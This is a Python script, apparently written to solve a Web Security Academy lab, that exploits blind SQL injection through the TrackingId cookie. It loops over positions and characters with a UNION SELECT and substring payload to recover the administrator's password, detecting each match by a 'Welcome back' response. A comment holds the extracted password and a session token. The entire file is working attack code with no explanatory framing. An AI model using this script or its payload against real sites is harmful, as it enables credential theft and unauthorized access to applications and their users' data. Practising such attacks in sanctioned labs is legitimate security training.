import requests

host="https://ac8f1f681e3df66c8101c56b002f0062.web-security-academy.net/"
passw=""
#trackingId="TrackingId==x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+and+length(password)=20+and+substring(password,"+pos+",1)='"+char+"'; session=FMgMIlbDPdjH6ClwZJoOAEVZh6Rk6w2a"

alph="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
for i in range(1,21):
	pos=str(i)
	for j in alph:
		ch=j
		trackingId="x'+UNION+SELECT+'a'+FROM+users+WHERE+username='administrator'+and+substring(password,"+pos+",1)='"+ch+"'--"
		#print(trackingId)
		c={'TrackingId':trackingId}
		#print(c)
		#print(type(c))
		resp=requests.get(url=host,cookies=c)
		if("Welcome back" in resp.text):
			#print("YES")
			passw=passw+j
			print(passw)
			break
			
	#+and+substring(password,"+pos+",1)='"+ch+"'
	# ch1ftl285d14w49m9uks